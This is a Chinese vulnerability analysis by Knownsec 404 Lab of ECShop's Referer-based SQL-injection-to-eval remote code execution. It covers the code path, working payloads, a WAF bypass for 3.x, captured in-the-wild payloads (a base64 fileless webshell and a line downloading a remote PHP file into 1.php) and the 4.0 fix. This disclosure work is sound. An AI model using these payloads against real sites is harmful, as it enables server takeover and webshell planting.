**Author: Badcode@知道创宇404实验室  
Date: 2018/09/04**

### 背景

ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。2018年6月13日，知道创宇404积极防御团队通过知道创宇旗下云防御产品“创宇盾”防御拦截并捕获到一个针对某著名区块链交易所网站的攻击，通过分析，发现攻击者利用的正式ECShop
2.x版本的0day漏洞攻击。于2018年6月14日，提交到知道创宇Seebug漏洞平台并[收录](https://www.seebug.org/vuldb/ssvid-97343)。

随后于2018年8月31日，ID为“ringk3y”研究人员在其博客公开这个[漏洞](http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/)，并做了详细分析，该分析收录在[Seebug
Paper](https://paper.seebug.org/691/)。

知道创宇404积极防御团队于2018年9月2日正式对外发布[《ECShop全系列版本的远程代码执行漏洞》](https://www.yunaq.com/news/5b8ca434796db41371c1cf45/)预警。

从2018年的6月13日首次拦截后，知道创宇404实验室多个团队对这个利用ECShop
0day攻击事件进行持续的监控分析，从下文的分析结果可以看出一个0day漏洞在实际攻击中的各个阶段的“堕落”过程。

### 漏洞分析

该漏洞影响ECShop
2.x和3.x版本，是一个典型的“二次漏洞”，通过`user.php`文件中`display()`函数的模板变量可控，从而造成SQL注入漏洞，而后又通过SQL注入漏洞将恶意代码注入到危险函数`eval`中，从而实现了任意代码执行。

值得一提的是攻击者利用的payload只适用于ECShop 2.x版本导致有部分安全分析者认为该漏洞不影响ECShop
3.x，这个是因为在3.x的版本里有引入防注入攻击的安全代码，通过我们分析发现该防御代码完全可以绕过实现对ECShop 3.x的攻击（详见下文分析）。

注：以下代码分析基于ECShop 2.7.3

#### SQL 注入漏洞

首先看到`ecshop/user.php`

    
    
    elseif ($action == 'login')
    {
        if (empty($back_act))
        {
            if (empty($back_act) && isset($GLOBALS['_SERVER']['HTTP_REFERER']))
            {
                $back_act = strpos($GLOBALS['_SERVER']['HTTP_REFERER'], 'user.php') ? './index.php' : $GLOBALS['_SERVER']['HTTP_REFERER'];
            }
            else
            {
                $back_act = 'user.php';
            }
    
        }
    
    
        $captcha = intval($_CFG['captcha']);
        if (($captcha & CAPTCHA_LOGIN) && (!($captcha & CAPTCHA_LOGIN_FAIL) || (($captcha & CAPTCHA_LOGIN_FAIL) && $_SESSION['login_fail'] > 2)) && gd_version() > 0)
        {
            $GLOBALS['smarty']->assign('enabled_captcha', 1);
            $GLOBALS['smarty']->assign('rand', mt_rand());
        }
    
        $smarty->assign('back_act', $back_act);
        $smarty->display('user_passport.dwt');
    }

可以看到`$back_act`是从`HTTP_REFERER`获取到的，`HTTP_REFERER`是外部可控的，这也是万恶的根源。

接着将`back_act`变量传递给`assign`函数，跟进`ecshop/includes/cls_template.php`

    
    
       /**
         * 注册变量
         *
         * @access  public
         * @param   mix      $tpl_var
         * @param   mix      $value
         *
         * @return  void
         */
        function assign($tpl_var, $value = '')
        {
            if (is_array($tpl_var))
            {
                foreach ($tpl_var AS $key => $val)
                {
                    if ($key != '')
                    {
                        $this->_var[$key] = $val;
                    }
                }
            }
            else
            {
                if ($tpl_var != '')
                {
                    $this->_var[$tpl_var] = $value;
                }
            }
        }

可以从注释了解这个函数的功能，是注册模板变量，也就是`$back_act`变成了`$this->_var[$back_act]=$back_act`，而后调用`display`函数

    
    
        function display($filename, $cache_id = '')
        {
            $this->_seterror++;
            error_reporting(E_ALL ^ E_NOTICE);
    
            $this->_checkfile = false;
            $out = $this->fetch($filename, $cache_id);
    
            if (strpos($out, $this->_echash) !== false)
            {
                $k = explode($this->_echash, $out);
                foreach ($k AS $key => $val)
                {
                    if (($key % 2) == 1)
                    {
                        $k[$key] = $this->insert_mod($val);
                    }
                }
                $out = implode('', $k);
            }
            error_reporting($this->_errorlevel);
            $this->_seterror--;
    
            echo $out;
        }

从`user.php`调用`display`函数，传递进来的`$filename`是`user_passport.dwt`，从函数来看，首先会调用`$this->fetch`来处理`user_passport.dwt`模板文件，`fetch`函数中会调用`$this->make_compiled`来编译模板。`user_passport.dwt`其中一段如下：

    
    
                <td>&nbsp;</td>
                <td align="left">
                <input type="hidden" name="act" value="act_login" />
                <input type="hidden" name="back_act" value="{$back_act}" />
                <input type="submit" name="submit" value="" class="us_Submit" />
                </td>

`make_compiled`会将模板中的变量解析，也就是在这个时候将上面`assign`中注册到的变量`$back_act`传递进去了，解析完变量之后返回到`display`函数中。此时`$out`是解析变量后的html内容，判断`$this->_echash`是否在`$out`中，若在，使用`$this->_echash`来分割内容，得到`$k`然后交给`insert_mod`处理。

![](https://images.seebug.org/content/images/2018/09/72af3873-78fd-40c4-b560-a889e1f7ddf6.png-w331s)

由于`_echash`是默认的，不是随机生成的，所以`$val`内容可随意控制。跟进`$this->insert_mod`

    
    
        function insert_mod($name) // 处理动态内容
        {
            list($fun, $para) = explode('|', $name);
            $para = unserialize($para);
            $fun = 'insert_' . $fun;
    
            return $fun($para);
        }

`$val`传递进来，先用`|`分割，得到`$fun`和`$para`，`$para`进行反序列操作，`$fun`和`insert_`拼接，最后动态调用`$fun($para)`，函数名部分可控，参数完全可控。接下来就是寻找以`insert_`开头的可利用的函数了，在`ecshop/includes/lib_insert.php`有一个`insert_ads`函数，正好满足要求。看下`insert_ads`

    
    
    /**
     * 调用指定的广告位的广告
     *
     * @access  public
     * @param   integer $id     广告位ID
     * @param   integer $num    广告数量
     * @return  string
     */
    function insert_ads($arr)
    {
        static $static_res = NULL;
    
        $time = gmtime();
        if (!empty($arr['num']) && $arr['num'] != 1)
        {
            $sql  = 'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, ' .
                        'p.ad_height, p.position_style, RAND() AS rnd ' .
                    'FROM ' . $GLOBALS['ecs']->table('ad') . ' AS a '.
                    'LEFT JOIN ' . $GLOBALS['ecs']->table('ad_position') . ' AS p ON a.position_id = p.position_id ' .
                    "WHERE enabled = 1 AND start_time <= '" . $time . "' AND end_time >= '" . $time . "' ".
                        "AND a.position_id = '" . $arr['id'] . "' " .
                    'ORDER BY rnd LIMIT ' . $arr['num'];
            $res = $GLOBALS['db']->GetAll($sql);
        }
    ......
        $ads = array();
        $position_style = '';
    
        foreach ($res AS $row)
        {
            if ($row['position_id'] != $arr['id'])
            {
                continue;
            }
            $position_style = $row['position_style'];
            switch ($row['media_type'])
            {
    ......
        }
        $position_style = 'str:' . $position_style;
    
        $need_cache = $GLOBALS['smarty']->caching;
        $GLOBALS['smarty']->caching = false;
    
        $GLOBALS['smarty']->assign('ads', $ads);
        $val = $GLOBALS['smarty']->fetch($position_style);
    
        $GLOBALS['smarty']->caching = $need_cache;
    
        return $val;
    }

`$arr`是可控的，并且会拼接到SQL语句中，这就造成了SQL注入漏洞。

根据上面的流程，可以构造出如下形式的payload

    
    
    echash+fun|serialize(array("num"=>sqlpayload,"id"=>1))

实际可利用payload

    
    
    Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";i:1;}

![](https://images.seebug.org/content/images/2018/09/e15c5119-0ede-432b-8630-e71b46b14251.png-w331s)

#### 代码执行

继续看`insert_ads`函数

    
    
    $position_style = '';
    
        foreach ($res AS $row)
        {
            if ($row['position_id'] != $arr['id'])
            {
                continue;
            }
            $position_style = $row['position_style'];
            switch ($row['media_type'])
            {
    ......
        $position_style = 'str:' . $position_style;
    
        $need_cache = $GLOBALS['smarty']->caching;
        $GLOBALS['smarty']->caching = false;
    
        $GLOBALS['smarty']->assign('ads', $ads);
        $val = $GLOBALS['smarty']->fetch($position_style);
    
        $GLOBALS['smarty']->caching = $need_cache;
    
        return $val;

可以看到在SQL查询结束之后会调用模板类的`fetch`方法，在`user.php`中调用`display`，然后调用`fetch`的时候传入的参数是`user_passport.dwt`，而在此处传入的参数是`$position_style`，向上溯源，发现是`$row['position_style']`赋值而来，也就是SQL语句查询的结果，结果上面这个SQL注入漏洞，SQL查询的结果可控，也就是`$position_style`可控。

要到`$position_style =
$row['position_style'];`还有一个条件，就是`$row['position_id']`要等于`$arr['id']`，查询结果可控，`arr['id']`同样可控。

之后`$position_style`会拼接`'str:'`传入`fetch`函数，跟进`fetch`

    
    
    /**
         * 处理模板文件
         *
         * @access  public
         * @param   string      $filename
         * @param   sting      $cache_id
         *
         * @return  sring
         */
        function fetch($filename, $cache_id = '')
        {
            if (!$this->_seterror)
            {
                error_reporting(E_ALL ^ E_NOTICE);
            }
            $this->_seterror++;
    
            if (strncmp($filename,'str:', 4) == 0)
            {
                $out = $this->_eval($this->fetch_str(substr($filename, 4)));
            }
            else
            {
                ......

因为之前拼接`'str:'`了，所以`strncmp($filename,'str:', 4) ==
0`为真，然后会调用危险函数`$this->_eval`，这就是最终触发漏洞的点。但是参数在传递之前要经过`fetch_str`方法的处理，跟进

    
    
        /**
         * 处理字符串函数
         *
         * @access  public
         * @param   string     $source
         *
         * @return  sring
         */
        function fetch_str($source)
        {
            if (!defined('ECS_ADMIN'))
            {
                $source = $this->smarty_prefilter_preCompile($source);
            }
            $source=preg_replace("/([^a-zA-Z0-9_]{1,1})+(copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo)+( |\()/is", "", $source);
            if(preg_match_all('~(<\?(?:\w+|=)?|\?>|language\s*=\s*[\"\']?php[\"\']?)~is', $source, $sp_match))
            {
                $sp_match[1] = array_unique($sp_match[1]);
                for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp < $for_max2; $curr_sp++)
                {
                    $source = str_replace($sp_match[1][$curr_sp],'%%%SMARTYSP'.$curr_sp.'%%%',$source);
                }
                 for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp < $for_max2; $curr_sp++)
                {
                     $source= str_replace('%%%SMARTYSP'.$curr_sp.'%%%', '<?php echo \''.str_replace("'", "\'", $sp_match[1][$curr_sp]).'\'; ?>'."\n", $source);
                }
             }
             return preg_replace("/{([^\}\{\n]*)}/e", "\$this->select('\\1');", $source);
        }

第一个正则会匹配一些关键字，然后置空，主要看下最后一个正则

    
    
     return preg_replace("/{([^\}\{\n]*)}/e", "\$this->select('\\1');", $source);

这个正则是将捕获到的值交于`$this-select()`函数处理。例如，`$source`的值是`xxx{$abc}xxx`，正则捕获到的group 1
就是`$abc`，然后就会调用`$this-select("$abc")`。

![](https://images.seebug.org/content/images/2018/09/67c203d1-d48d-4354-927b-49d8a5f10c8f.png-w331s)

跟进`select`函数

    
    
        /**
         * 处理{}标签
         *
         * @access  public
         * @param   string      $tag
         *
         * @return  sring
         */
        function select($tag)
        {
            $tag = stripslashes(trim($tag));
    
            if (empty($tag))
            {
                return '{}';
            }
            elseif ($tag{0} == '*' && substr($tag, -1) == '*') // 注释部分
            {
                return '';
            }
            elseif ($tag{0} == '$') // 变量
            {
    //            if(strpos($tag,"'") || strpos($tag,"]"))
    //            {
    //                 return '';
    //            }
                return '<?php echo ' . $this->get_val(substr($tag, 1)) . '; ?>';
            }
            ......

当传入的变量的第一个字符是`$`，会返回由 php
标签包含变量的字符串，最终返回到`_eval()`危险函数内，执行。在返回之前，还调用了`$this->get_var`处理，跟进`get_var`

    
    
        /**
         * 处理smarty标签中的变量标签
         *
         * @access  public
         * @param   string     $val
         *
         * @return  bool
         */
        function get_val($val)
        {
            if (strrpos($val, '[') !== false)
            {
                $val = preg_replace("/\[([^\[\]]*)\]/eis", "'.'.str_replace('$','\$','\\1')", $val);
            }
    
            if (strrpos($val, '|') !== false)
            {
                $moddb = explode('|', $val);
                $val = array_shift($moddb);
            }
    
            if (empty($val))
            {
                return '';
            }
    
            if (strpos($val, '.$') !== false)
            {
                $all = explode('.$', $val);
    
                foreach ($all AS $key => $val)
                {
                    $all[$key] = $key == 0 ? $this->make_var($val) : '['. $this->make_var($val) . ']';
                }
                $p = implode('', $all);
            }
            else
            {
                $p = $this->make_var($val);
            }

当传入的变量没有`.$`时，调用`$this->make_var`，跟进`make_var`

    
    
        /**
         * 处理去掉$的字符串
         *
         * @access  public
         * @param   string     $val
         *
         * @return  bool
         */
        function make_var($val)
        {
            if (strrpos($val, '.') === false)
            {
                if (isset($this->_var[$val]) && isset($this->_patchstack[$val]))
                {
                    $val = $this->_patchstack[$val];
                }
                $p = '$this->_var[\'' . $val . '\']';
            }
            else
            {
               .....

在这里结合`select`函数里面的语句来看，`<?php echo $this->_var[' $val
'];?>`，要成功执行代码的话，`$val`必须要把`['`闭合，所以payload构造，从下往上构造，`$val`为`abc'];echo
phpinfo();//`；从`select`函数进入`get_var`的条件是第一个字符是`$`，所以payload变成了`$abc'];echo
phpinfo();//`；而要进入到`select`，需要被捕获，payload变成了`{$abc'];echo
phpinfo();//}`，这里因为payload的是`phpinfo()`，这里会被`fetch_str`函数的第一个正则匹配到，需要变换一下，所以payload变为`{$abc'];echo
phpinfo/**/();//}`，到这里为止，php 恶意代码就构造完成了。

接下来就是把构造好的代码通过SQL注入漏洞传给`$position_style`。 这里可以用union select
来控制查询的结果，根据之前的流程，`$row['position_id']`和`$arr['id']`要相等，`$row['position_id']`是第二列的结果，`$position_style`是第九列的结果。`$arr['id']`传入`'
/*`,`$arr['num']`传入`*/ union select
1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10---`，`0x27202f2a`是`'
/*`的16进制值，也就是`$row['position_id']`的值，`0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d`是上面构造的php代码的16进制值，也就是`$position_style`。

![](https://images.seebug.org/content/images/2018/09/cd7f6796-c175-46c0-a7c4-9cdb480ab960.png-w331s)

结合之前的SQL漏洞的payload构造，所以最终的payload的是

    
    
    Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:110:"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -";s:2:"id";s:4:"' /*";}554fcae493e564ee0dc75bdf2ebf94ca

![](https://images.seebug.org/content/images/2018/09/5bd38eb7-4167-44b0-83d4-f49453ae8bcd.png-w331s)

可以看到成功的执行了`phpinfo()`。

#### ECShop 3.x 绕过

上述的测试环境都是2.7.3的，理论上打2.x都没问题，而在3.x上是不行的，原因是3.x自带了个WAF(`ecshop/includes/safety.php`)，对所有传入的参数都做了检测，按照上面构造的
payload ，`union select` 会触发SQL注入的检测规则，有兴趣的可以去绕绕，我没绕过。。

下面的测试版本为ECshop3.0，3.x版本的`echash`是`45ea207d7a2b68c49582d2d22adf953a`。 上面说了
`insert_ads` 函数存在注入，并且有两个可控点，`$arr['id']`和`$arr['num']`，可以将`union
select`通过两个参数传递进去，一个参数传递一个关键字，中间的可以使用`/**/`注释掉，这样就不会触发WAF。

![](https://images.seebug.org/content/images/2018/09/0e32a471-7fb1-4e40-b422-3418bbb983f6.png-w331s)

### 实际攻击分析

上文提到该漏洞最早由知道创宇404积极防御团队通过知道创宇旗下云防御产品“创宇盾”在2018年6月13日拦截并捕获，随后针对这个漏洞的攻击情况做了详细的监控及跟进：

#### 第一阶：0day在野之“APT攻击” (2018年6月13日)

首次捕获到 2.x 的 payload 是被用来攻击某区块链交易所网站，因此我们高度怀疑攻击者是用 0day 来攻击区块链交易所的 apt团队。样本中
payload 通过HTTP 请求头的`Referer`字段植入，如下

![](https://images.seebug.org/content/images/2018/09/574b3c24-0cd0-4ff9-9ca0-e421bb40d4d1.png-w331s)

把捕获的 payload 转码出来看

    
    
    Referer: http://www.noxxx.com/554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:2:"id";s:3:"'/*";s:3:"num";S:216:"*/UNION select 1,0x272f2a,3,4,5,6,7,8,0x7b2461275d3b617373657274286261736536345f6465636f64652827514556575155776f596d467a5a5459305832526c5932396b5a53676b58314250553152624a303576654364644b536b372729293b24615b27317d,10#";}554fcae493e564ee0dc75bdf2ebf94ca

恶意代码

    
    
    {$a'];assert(base64_decode('QEVWQUwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ05veCddKSk7'));$a['1}

base64部分的内容是

    
    
    @EVAL(base64_decode($_POST['Nox']));

可以看到，没有写入
webshell，而是直接接收`$_POST['Nox']`参数，进行base64解码后直接传入`eval`函数执行代码，相当于一个无文件的
webshell ，非常隐蔽。

![](https://images.seebug.org/content/images/2018/09/c066f65e-add3-418a-bd6f-6d9595fbd363.png-w331s)

本次攻击是由一个日本ip(35.200.*.*)发起,通过攻击的手法及使用的paylaod等情况来看，并直接了当地用来攻击某著名区块链交易所，我们高度怀疑是目的性非常明确的“APT攻击”。

#### 第二阶：0day在野之“黑产攻击” （2018年8月）

在随后整个7月都没有出现利用该漏洞攻击的记录直到8月初，在整个8月拦截捕获该0day漏洞攻击记录10余次，攻击者使用的 payload
都相同，且都是一个菲律宾IP(180.191.*.*)发起的攻击。如下：

    
    
    554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:3:"num";s:314:"/<SP>union<SP>select<SP>1,0x272f2a,3,4,5,6,7,8,0x7B247B24686F6D65275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A7A4575634768774A79786D6157786C5832646C6446396A623235305A5735306379676E6148523063446F764C33566C5A5335745A53394E636B706A4A796B704F773D3D2729293B2F2F7D7D,10--<SP>-";s:2:"id";s:3:"'/";s:4:"name";s:3:"ads";}554fcae493e564ee0dc75bdf2ebf94ca

`//
file_put_contents('1.php',file_get_contents('http://uee.me/MrJc'));`和这篇[分析文章](https://xz.aliyun.com/t/2689)里捕获到的样本一致。

从整个8月拦截的10余次攻击目标，payload等手法来看，我们认为极有可能该0day漏洞已经被流入到“高端黑产”团队，并进行了批量自动化攻击。

#### 第三阶：0day曝光之“疯狂攻击” （2018年8月31日后）

在2018年8月31日漏洞细节被公开之后，攻击数量开始增加，捕获到的 payload 也变的多种多样，漏洞被广泛利用。

![](https://images.seebug.org/content/images/2018/09/e0afe826-ab54-4a8d-b846-6d2f41c873ca.png-w331s)

从这些人使用的攻击目标、手法及payload（攻击使用的payload仍然只适用于2.x版本，目前为止没有看到使用针对3.x
payload攻击）等情况来看，考虑大量的“低端黑产”玩家开始加入进来，继续“疯狂”的抓鸡行动中，榨干这个漏洞的最后一滴“油水”...

### 漏洞影响范围及修复

根据ZoomEye网络空间搜索引擎对ECShop关键字的[搜索结果](https://www.zoomeye.org/searchResult?q=ecshop)，共找到42400
条历史记录。

![](https://images.seebug.org/content/images/2018/09/4729bfb0-8ffc-459f-a529-fe6580cc94af.png-w331s)

#### 漏洞修复

目前我们分析下载最新版的ECShop 4.0里对这个漏洞进行修复：

看到`ecshop4/ecshop/includes/lib_insert.php`

![
](https://images.seebug.org/content/images/2018/09/d542c73a-d3ef-4e89-8394-aa85c7f1332e.png-w331s)

可以看到，将传递进来的`$arr[id]`和`$arr[num]`强制转换成整型，这样就没法利用这个漏洞了。

另外我们注意到官方并没有发布针对老版本的(2.x和3.x)的独立修复补丁，相关老版本的用户可参考ECShop 4.0代码来修复或者直接升级到ECShop
4.0。

### 小结

本次ECShop这个漏洞挖掘到漏洞利用非常有技术含量，可以算是一个经典的“二次漏洞”案例，从一个SQL注入漏洞最后完美实现转变为代码执行漏洞。另外从这个漏洞在野外实际利用的过程，也非常的“经典”，完美重现了一个0day漏洞被挖掘利用转变为“武器”后的完美历程：从被用来目标明确的“定向攻击”，再到“黑产”高端玩家，直到最后在曝光后沦为黑产“抓鸡”工具的“堕落”
...

感谢我们404实验室各团队小伙伴的努力～～ 我爱你们～～

### 参考链接

  * [ecshop2.x代码执行](http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/)
  * [ECShop全系列版本远程代码执行高危漏洞分析](https://xz.aliyun.com/t/2689)
  * [ecshop 2.7.3 代码执行漏洞](https://www.seebug.org/vuldb/ssvid-97343)
  * [ZoomEye 搜索结果](https://www.zoomeye.org/searchResult?q=ecshop)
  * [安全预警| ECShop全系列版本远程代码执行高危漏洞 创宇盾无需升级即可防御](https://www.yunaq.com/news/5b8ca434796db41371c1cf45/)
  * [二次漏洞](https://wenku.baidu.com/view/ff7cea6f6529647d26285259.html)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/695/>

